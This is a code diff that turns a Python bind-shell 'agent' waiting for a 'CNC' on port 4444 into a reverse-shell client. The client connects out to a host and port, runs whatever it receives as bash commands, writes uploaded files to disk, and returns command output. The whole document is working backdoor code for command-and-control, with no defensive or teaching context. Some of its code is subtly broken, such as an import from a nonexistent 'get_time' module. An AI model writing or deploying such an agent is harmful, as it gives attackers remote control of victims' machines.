@@ -1,30 +1,97 @@
-import socket
-import subprocess
-import sys
+#!/usr/bin/python
+from socket import socket, AF_INET, SOCK_STREAM, error
 
+from subprocess import Popen, PIPE
 
-socksize = 1024
+from get_time import sleep
 
-host = '0.0.0.0'
-port = 4444
+from sys import exit as exitapp
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((host, port))
-server.listen(1)
-print("Agent started on port: {}\nWaiting for connections from CNC...\n".format(port))
-conn, addr = server.accept()
+buffer_size = 4096
+
+host = '127.0.0.1'
+
+port = 1234
+
+sock = socket(AF_INET, SOCK_STREAM)
+
+sock.settimeout(5)
+
+try:
+
+    # print 'Trying to connect..\n'
+
+    sock.connect((host, port))
+
+except error as msg:
+
+    print "Socket Error: %s" % msg
 
 while True:
-    print('New connection from {}:{}'.format(addr[0], addr[1]))
-    data = conn.recv(socksize)
-    if not data:
-        continue
-    elif data == 'killsrv':
-        break
-    else:
-        cmd = ['/bin/bash', '-c', data]
-        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE)
-        stdout, stderr = proc.communicate()
 
-server.close()
-sys.exit(0)
+    try:
+
+        data = sock.recv(buffer_size)
+
+        if (data == "F"):
+
+            des = sock.recv(4096)
+
+            f = open(des, 'wb')
+
+            while True:
+
+                try:
+
+                    data = sock.recv(1024)
+
+                    if data == "E":
+                        f.close()
+
+                        break
+
+                    f.write(data)
+
+                except:
+
+                    f.close()
+
+                    break
+
+        if (data == "package"):
+            pack_info = sock.recv(buffer_size)
+
+            proc = Popen(pack_info, shell=True, stdin=None, stderr=None, executable="/bin/bash")
+
+            proc.wait()
+
+        if (data == "shell"):
+
+            command = sock.recv(buffer_size)
+
+            proc = Popen(command, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable="/bin/bash")
+
+            out, err = proc.communicate()
+
+            if (out == ""):
+                sock.send(err)
+
+            sock.send(out)
+
+        else:
+
+            proc = Popen(data, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable="/bin/bash")
+
+            out, err = proc.communicate()
+
+            if (out == ""):
+                sock.send(err)
+
+            sock.send(out)
+
+            # didn't get any data...why? print the e to debug..otherwise continue(print e)
+
+    except Exception as e:
+
+        continue
+
